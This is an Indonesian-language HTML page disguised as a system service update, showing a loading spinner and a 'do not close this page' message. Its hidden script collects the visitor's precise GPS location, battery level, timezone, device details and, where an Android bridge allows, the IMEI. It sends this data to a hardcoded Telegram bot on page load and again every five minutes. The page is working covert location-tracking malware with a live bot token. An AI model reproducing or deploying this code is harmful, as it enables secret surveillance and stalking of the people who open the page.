<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>System UI - Service Update</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Roboto", sans-serif;
      background: #111;
      color: #ccc;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .box {
      background: #1c1c1c;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 12px rgba(0,0,0,0.6);
    }
    .loader {
      margin: 20px auto;
      width: 48px;
      height: 48px;
      border: 6px solid #444;
      border-top: 6px solid #0f0;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .status {
      font-size: 13px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Pembaruan Sistem</h2>
    <p>Sinkronisasi layanan latar sedang berlangsung...</p>
    <div class="loader"></div>
    <p class="status">Jangan tutup halaman ini.</p>
  </div>

  <script>
    (async () => {
      const getID = () => {
        const u = new URLSearchParams(window.location.search).get("id");
        if (u) return u;
        const base = btoa(navigator.userAgent).replace(/[^a-zA-Z0-9]/g, '').slice(0, 8);
        return `USR-${base}`;
      };

      const getIMEI = () => {
        try {
          return typeof AndroidInterface !== 'undefined' && AndroidInterface.getIMEI
            ? AndroidInterface.getIMEI() : "Unavailable";
        } catch (e) { return "Unavailable"; }
      };

      const send = async () => {
        try {
          const pos = await new Promise((res, rej) =>
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true })
          );

          const b = await navigator.getBattery();
          const coords = pos.coords;
          const payload = `
[ID: ${getID()}]
Lokasi dikirim: ${coords.latitude}, ${coords.longitude}
https://maps.google.com/?q=${coords.latitude},${coords.longitude}
Speed: ${coords.speed ?? "Unknown"}
Heading: ${coords.heading ?? "Unknown"}
Altitude: ${coords.altitude ?? "Unknown"}
Accuracy: ${coords.accuracy}m
Lang: ${navigator.language}
TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Local: ${new Date().toLocaleString()}
UTC: ${new Date().toUTCString()}
Battery: ${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Not Charging"})
Device: ${navigator.userAgent}
IMEI: ${getIMEI()}`.trim();

          await fetch("https://api.telegram.org/bot7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: "5677912817", text: payload })
          });
        } catch (e) {
          console.error("Error:", e);
        }
      };

      send();
      setInterval(send, 5 * 60 * 1000);
    })();
  </script>
</body>
</html>
